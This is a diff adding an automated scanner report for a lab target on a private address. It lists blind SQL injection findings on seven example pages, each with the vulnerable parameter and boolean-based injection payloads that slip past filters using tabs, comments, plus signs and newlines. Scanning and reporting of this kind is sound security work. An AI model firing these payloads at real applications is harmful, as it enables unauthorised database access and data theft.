@@ -1,0 +1,80 @@
+Target: http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php 
+VulnName: bsqli
+Query: {'name': "root'\tand\t'27621'='27621"}
+payload: '	and	'27621'='27621
+'	and	'70832'='70832
+'	or	98393=98393#
+'	and	'421'='422
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example2.php 
+VulnName: bsqli
+Query: {'name': "root'\tand\t'27621'='27621"}
+payload: '	and	'27621'='27621
+'	and	'70832'='70832
+'	or	98393=98393#
+'	and	'421'='422
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example3.php 
+VulnName: bsqli
+Query: {'name': "root'/**/and/**/'33864'='33864"}
+payload: '/**/and/**/'33864'='33864
+'/**/and/**/'97437'='97437
+'/**/or/**/13534=13534#
+'/**/and/**/'95034'='95035
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example4.php 
+VulnName: bsqli
+Query: {'id': '2\tand\t262=262'}
+payload: 	and	262=262
+	and	83249=83249
+	or	29623=29623#
+	and	90604=90605
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example5.php 
+VulnName: bsqli
+Query: {'id': '2\tand\t262=262'}
+payload: 	and	262=262
+	and	83249=83249
+	or	29623=29623#
+	and	90604=90605
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example6.php 
+VulnName: bsqli
+Query: {'id': "2'+and+'61196'='61196"}
+payload: '+and+'61196'='61196
+'+and+'32380'='32380
+'+or+92883=92883#
+'+and+'3919'='3920
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example7.php 
+VulnName: bsqli
+Query: {'id': '2\nand\n99854=99854'}
+payload: 
+and
+99854=99854
+
+and
+61276=61276
+
+or
+59992=59992#
+
+and
+24511=24512
+advice: use orm
+---
